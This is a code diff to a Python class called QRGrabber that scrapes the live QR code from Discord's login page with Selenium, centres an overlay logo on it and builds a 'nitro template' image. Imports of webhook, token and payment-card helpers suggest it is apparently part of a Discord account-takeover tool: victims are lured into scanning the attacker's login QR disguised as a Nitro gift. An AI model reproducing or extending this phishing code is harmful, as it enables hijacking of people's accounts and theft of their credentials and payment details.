@@ -1,10 +1,12 @@
 import os
 import re
-from bs4 import BeautifulSoup
 from discord_webhook import DiscordEmbed, DiscordWebhook
 from discord_webhook.webhook_exceptions import ColorNotInRangeException
 from PIL import Image
 from requests import get
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support import expected_conditions as EC
 from constants import EMBED_AVATAR, EMBED_COLOR, EMBED_USERNAME, PAYMENT_CARD, PAYMENT_PAYPAL
 from exceptions import InvalidToken, QRCodeNotFound, WebhookSendFailure
 
@@ -16,19 +18,23 @@ class QRGrabber:
     def __init__(self, resources_path: str) -> None:
         self.resources_path = resources_path
 
-    def get_qr_from_source(self, source: BeautifulSoup) -> str:
-        if not (div := re.search(r'qrCode-......', str(source))):
-            raise QRCodeNotFound(
-                'The QR code could not be found on the Discord login page — please try again or contact the developers.')
-        div = div.group(0)
-        div = source.find('div', {"class": f"{div}"})
-        qr_code = div.find('img')['src']
-        return qr_code
+    def get_qr_from_source(self, driver: webdriver):
+        elements = driver.find_elements(By.TAG_NAME, 'svg')
+        if len(elements) != 5:
+            raise QRCodeNotFound("The QR code could not be found on the Discord login page — please try again or contact the developers.")
+        element = elements[3]
+        return element.get_attribute("outerHTML")
 
     def generate_qr_for_template(self, path_1: str, path_2: str) -> None:
         qr_img = Image.open(path_1, 'r')
         ovly_img = Image.open(os.path.join(os.path.dirname(os.path.realpath(__file__)) ,self.resources_path, 'overlay.png'), 'r')
-        qr_img.paste(ovly_img, (60, 55))
+        qr_width, qr_height = qr_img.size
+        center_x = qr_width // 2
+        center_y = qr_height // 2
+        logo_width, logo_height = ovly_img.size
+        logo_top_left_x = center_x - logo_width // 2
+        logo_top_left_y = center_y - logo_height // 2
+        qr_img.paste(ovly_img, (logo_top_left_x, logo_top_left_y))
         qr_img.save(path_2, quality=95)
 
     def generate_nitro_template(self, path_2: str) -> None:
